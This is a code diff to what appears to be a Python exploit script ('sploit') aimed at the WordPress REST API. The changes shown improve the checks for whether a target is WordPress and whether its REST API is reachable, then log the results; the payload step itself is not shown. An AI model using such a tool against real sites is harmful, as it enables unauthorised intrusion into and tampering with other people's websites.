@@ -28,10 +28,12 @@ def sploit(base_url, article_id, test, payload, format):
     
     # Try connection to website
     r = requests.get(base_url)
-    if not 'WordPress' in r.text:
+    
+    if not re.search('(wordpress|xmlrpc\.php)', r.text.encode('utf-8'), re.IGNORECASE) :
         logger.error('Base URL does not seem to be a WordPress URL')
         return
         
+    logger.info('Base URL is a WordPress URL')
         
     # Test REST API
     base_api = base_url + 'wp-json/wp/v2/'
@@ -39,12 +41,11 @@ def sploit(base_url, article_id, test, payload, format):
     
     r = requests.get(posts_api)
     
-    try:
-        j = json.loads(r.text)
-    except Exception, e:
-        logger.error('Could not find suitable API at %s' % base_api)
+    if r.status_code!=200:
+        logger.error('REST API does not seem to be enabled, not vulnerable')
         return
-    
+        
+    logger.info('REST API is enabled')    
     
     if test:
     
